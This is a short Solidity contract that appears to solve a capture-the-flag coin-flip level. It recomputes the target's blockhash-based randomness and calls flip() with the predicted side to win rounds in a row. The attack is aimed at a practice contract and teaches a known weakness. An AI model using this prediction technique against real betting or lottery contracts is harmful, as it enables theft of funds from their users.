// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipSlove {
  uint256 public consecutiveWins;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address coinFlipAddr;

  constructor(address _coinFlipAddr ) {
    consecutiveWins = 0;
    coinFlipAddr = _coinFlipAddr;
  }

  function guess() public returns (bool) {
    require(consecutiveWins <= 3, "enough guesses");

    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 flip = blockValue / FACTOR;
    bool side = flip == 1 ? true : false;

    bool r = CoinFlip(coinFlipAddr).flip(side);

    if (r) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}